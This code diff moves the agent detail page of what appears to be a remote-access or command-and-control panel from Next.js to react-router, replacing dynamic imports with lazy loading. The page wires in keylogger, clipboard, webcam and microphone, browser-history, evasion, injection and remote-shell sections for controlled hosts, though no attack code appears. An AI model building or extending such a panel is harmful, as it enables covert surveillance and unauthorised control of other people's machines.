@@ -1,8 +1,8 @@
 "use client";
 
-import { useCallback, useEffect, useState, useMemo, useRef, memo, type ReactNode } from "react";
-import { useParams, useRouter } from "next/navigation";
-import Link from "next/link";
+import { useCallback, useEffect, useState, useMemo, useRef, memo, type ReactNode, lazy, Suspense } from "react";
+import { useParams, useNavigate } from "react-router-dom";
+import { Link } from "react-router-dom";
 import { api, ApiError, pollTask } from "@/lib/api";
 import { paths } from "@/lib/api-paths";
 import { downloadText } from "@/lib/download";
@@ -22,7 +22,7 @@ import { Collapsible, CollapsibleContent } from "@/components/ui/collapsible";
 import { Bug } from "lucide-react";
 import { Banner } from "@/components/ui/banner";
 import { AgentStatus, AgentDetail as AgentDetailExt, AgentTaskRecord } from "@/types/agent";
-import dynamic from "next/dynamic";
+
 import AgentHeader from "./_components/AgentHeader";
 import AgentDetailChrome from "./_components/AgentDetailChrome";
 import AgentStatsGrid from "./_components/AgentStatsGrid";
@@ -34,19 +34,19 @@ import QuickShellSection from "./_components/QuickShellSection";
 import { AISuggestCard } from "./_components/AISuggestCard";
 import NotesTagsSection from "./_components/NotesTagsSection";
 // Below-fold sections load on demand so the detail chunk parses faster.
-const ProcessSection = dynamic(() => import("./_components/ProcessSection"), { ssr: false });
-const ConnectionLogSection = dynamic(() => import("./_components/ConnectionLogSection"), { ssr: false });
-const EvasionSection = dynamic(() => import("./_components/EvasionSection"), { ssr: false });
-const InjectSection = dynamic(() => import("./_components/InjectSection"), { ssr: false });
-const TimelineSection = dynamic(() => import("./_components/TimelineSection"), { ssr: false });
-const BrowserHistorySection = dynamic(() => import("./_components/BrowserHistorySection"), { ssr: false });
-const KeyloggerSection = dynamic(() => import("./_components/KeyloggerSection"), { ssr: false });
-const ClipboardSection = dynamic(() => import("./_components/ClipboardSection"), { ssr: false });
-const WebcamMicSection = dynamic(() => import("./_components/WebcamMicSection"), { ssr: false });
-const ScreenTriggerSection = dynamic(() => import("./_components/ScreenTriggerSection"), { ssr: false });
-const RegistrySection = dynamic(() => import("./_components/RegistrySection"), { ssr: false });
-const ReconSection = dynamic(() => import("./_components/ReconSection"), { ssr: false });
-const HostInfoCard = dynamic(() => import("./_components/HostInfoCard").then((m) => ({ default: m.HostInfoCard })), { ssr: false });
+const ProcessSection = lazy(() => import("./_components/ProcessSection"));
+const ConnectionLogSection = lazy(() => import("./_components/ConnectionLogSection"));
+const EvasionSection = lazy(() => import("./_components/EvasionSection"));
+const InjectSection = lazy(() => import("./_components/InjectSection"));
+const TimelineSection = lazy(() => import("./_components/TimelineSection"));
+const BrowserHistorySection = lazy(() => import("./_components/BrowserHistorySection"));
+const KeyloggerSection = lazy(() => import("./_components/KeyloggerSection"));
+const ClipboardSection = lazy(() => import("./_components/ClipboardSection"));
+const WebcamMicSection = lazy(() => import("./_components/WebcamMicSection"));
+const ScreenTriggerSection = lazy(() => import("./_components/ScreenTriggerSection"));
+const RegistrySection = lazy(() => import("./_components/RegistrySection"));
+const ReconSection = lazy(() => import("./_components/ReconSection"));
+const HostInfoCard = lazy(() => import("./_components/HostInfoCard").then((m) => ({ default: m.HostInfoCard })));
 import {
   buildAgentCopyText,
   buildAgentMarkdown,
@@ -76,7 +76,7 @@ interface AgentDetailPageProps {
 export default memo(function AgentDetailPage({ agentId: agentIdProp, onClose }: AgentDetailPageProps = {}) {
   const { t } = useI18n();
   const params = useParams();
-  const router = useRouter();
+  const navigate = useNavigate();
   const id = agentIdProp || (params?.id as string);
   const embedded = Boolean(onClose);
   const onCloseRef = useRef(onClose);
@@ -197,14 +197,14 @@ export default memo(function AgentDetailPage({ agentId: agentIdProp, onClose }: 
       if (lbOpenRef.current) return;
       if (confirmOpenRef.current) return;
       if (onCloseRef.current && e.key === "Escape") { onCloseRef.current(); return; }
-      if (e.key === "s") router.push(`/agents/${id}/shell`);
-      else if (e.key === "f") router.push(`/agents/${id}/files`);
-      else if (e.key === "d") router.push(`/agents/${id}/screen`);
-      else if (e.key === "Escape") router.push("/agents");
+      if (e.key === "s") navigate(`/agents/${id}/shell`);
+      else if (e.key === "f") navigate(`/agents/${id}/files`);
+      else if (e.key === "d") navigate(`/agents/${id}/screen`);
+      else if (e.key === "Escape") navigate("/agents");
     };
     window.addEventListener("keydown", handleKeydown);
     return () => window.removeEventListener("keydown", handleKeydown);
-  }, [router, id]);
+  }, [navigate, id]);
 
   useEffect(() => {
     if (!id) return;
@@ -460,7 +460,7 @@ export default memo(function AgentDetailPage({ agentId: agentIdProp, onClose }: 
             {onClose ? (
               <Button variant="default" onClick={onClose}>{t("agents.detail_back_to_agents")}</Button>
             ) : (
-              <Button render={<Link href="/agents" />}>{t("agents.detail_back_to_agents")}</Button>
+              <Button render={<Link to="/agents" />}>{t("agents.detail_back_to_agents")}</Button>
             )}
           </div>
         </div>
@@ -527,38 +527,40 @@ export default memo(function AgentDetailPage({ agentId: agentIdProp, onClose }: 
             onNextLightbox={onNextLightbox}
           />
 
-          <ScreenTriggerSection agentId={id} online={status === "online"} />
+          <Suspense fallback={null}><ScreenTriggerSection agentId={id} online={status === "online"} /></Suspense>
 
-          <RegistrySection agentId={id} online={status === "online"} />
+          <Suspense fallback={null}><RegistrySection agentId={id} online={status === "online"} /></Suspense>
 
-          <ProcessSection
-            agentId={id}
-            online={status === "online"}
-            processList={processList}
-            loading={processLoading}
-            loadFailed={loadFailed}
-            expanded={processExpanded}
-            onToggle={handleToggleProcess}
-            onRefresh={refreshProcessList}
-          />
+          <Suspense fallback={null}>
+            <ProcessSection
+              agentId={id}
+              online={status === "online"}
+              processList={processList}
+              loading={processLoading}
+              loadFailed={loadFailed}
+              expanded={processExpanded}
+              onToggle={handleToggleProcess}
+              onRefresh={refreshProcessList}
+            />
+          </Suspense>
 
-          <EvasionSection agentId={id} online={status === "online"} />
+          <Suspense fallback={null}><EvasionSection agentId={id} online={status === "online"} /></Suspense>
 
-          <InjectSection agentId={id} online={status === "online"} osType={agent.os} />
+          <Suspense fallback={null}><InjectSection agentId={id} online={status === "online"} osType={agent.os} /></Suspense>
 
-          <TimelineSection agentId={id} online={status === "online"} />
+          <Suspense fallback={null}><TimelineSection agentId={id} online={status === "online"} /></Suspense>
 
-          <BrowserHistorySection agentId={id} online={status === "online"} />
+          <Suspense fallback={null}><BrowserHistorySection agentId={id} online={status === "online"} /></Suspense>
 
-          <KeyloggerSection agentId={id} online={status === "online"} />
+          <Suspense fallback={null}><KeyloggerSection agentId={id} online={status === "online"} /></Suspense>
 
-          <ClipboardSection agentId={id} online={status === "online"} />
+          <Suspense fallback={null}><ClipboardSection agentId={id} online={status === "online"} /></Suspense>
 
-          <WebcamMicSection agentId={id} online={status === "online"} />
+          <Suspense fallback={null}><WebcamMicSection agentId={id} online={status === "online"} /></Suspense>
 
-          <ReconSection agentId={id} online={status === "online"} />
+          <Suspense fallback={null}><ReconSection agentId={id} online={status === "online"} /></Suspense>
 
-          <HostInfoCard agentId={id} online={status === "online"} />
+          <Suspense fallback={null}><HostInfoCard agentId={id} online={status === "online"} /></Suspense>
         </div>
 
         {/* ── Right rail: reference + quick controls ── */}
@@ -622,7 +624,7 @@ export default memo(function AgentDetailPage({ agentId: agentIdProp, onClose }: 
             note={note}
           />
 
-          <ConnectionLogSection logs={logs} />
+          <Suspense fallback={null}><ConnectionLogSection logs={logs} /></Suspense>
         </div>
       </div>
 
